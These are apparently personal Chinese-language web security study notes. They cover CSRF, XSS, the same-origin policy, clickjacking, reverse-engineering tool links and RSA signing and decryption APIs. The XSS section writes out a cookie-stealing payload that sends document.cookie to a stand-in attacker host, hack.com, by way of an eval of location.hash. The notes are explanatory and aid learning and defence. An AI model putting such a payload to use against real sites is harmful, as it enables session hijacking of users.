CVE

# CSRF (Cross-site request forgery/跨站请求伪造)
1）前提：用户登录了A网站，有cookie；
2）登录了恶意网页B，网页的代码中会请求A网站；（相当于用户在不知情的情况下访问了A网站，如果A网站的接口是转账等接口，那么就会有财产损失）
防御）一般现代浏览器请求头都有：

# XSS (Cross Site Script/跨站脚本攻击) 


是当用户访问一个被内嵌了恶意代码的网站时，即使这个网站是官方网站，比如qq空间，还是会发送此网站的cookie给黑客
XSS 是在目标网站上放恶意脚本等着用户访问。
CSRF 是在恶意网站上跨域向目标网站发出访问请求(例如<img href>)，特点是无需JavaScript且要求用户已经登陆过目标网站。

如果我是网站开发者
在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，具体一点的介绍请google进行搜索

如果百度上有个链接地址是
http://www.baidu.com/#new%20Image().src="http://hack.com?cookie="+escape(document.cookie)
同时页面会执行了如下script脚本
eval(location.hash.substr(1));
//location.hash 获取#和后面的东西
那么谁访问后都会把cookie泄露



同源是指，域名，协议，端口相同。

比如说，下面的几个域名是同源的：

http://example.com/

http://example.com:80/

http://example.com/path/file

它们都具有相同的协议、相同的域名、相同的端口(不指定端口默认80)。

而下面几个域名是不同源的：

http://example.com/

http://example.com:8080/

http://www.example.com/

https://example.com:80/

https://example.com/

http://example.org/

http://ietf.org/

它们有不同的协议或不同的域名或不同的端口，要注意顶级域名和二级域名也是认为不同的域名。
————————————————
版权声明：本文为CSDN博主「汤姆丁1111」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/weixin_53841730/article/details/128812393



1.http://www.cr173.com/soft/14313.html           
ida：反汇编（分析强）
2.http://www.52pojie.cn/thread-350397-1-1.html    
ollydbg：反汇编（调试强，脱壳用）
3.http://rj.baidu.com/soft/detail/15788.html?ald   
wireshark：抓包
4.http://www.pc6.com/softview/SoftView_55129.html  
010Editor：二进制
5.http://www.uzzf.com/soft/25803.html             
Stud_PE：辅助学习PE




## 界面劫持

两层页面，用户看到的顶层，点击却点击到底层


|---|标准名称|---|
|---|---|---|
|RSA2|SHA256WithRSA|强制要求RSA密钥的长度至少为2048|
|RSA|SHA1WithRSA|对RSA密钥的长度不限制，推荐使用2048位以上|


对公钥处理的数据，其填充内容为伪随机的16进制字符串，每次操作的填充内容都不一样。这就是为什么每次使用公钥加密数据得到的结果都不一样

rsa加密数据中不允许存在\0

RSA解密API
int RSA_private_decrypt(int flen, unsigned char *from, unsigned char *to, RSA *rsa, int padding)
参数说明：
flen: 解密密钥长度
from: 要解密信息
to: 解密后的信息
padding: 填充方式( RSA_PKCS1_PADDING ，RSA_PKCS1_OAEP_PADDING，RSA_SSLV23_PADDING，RSA_NO_PADDING)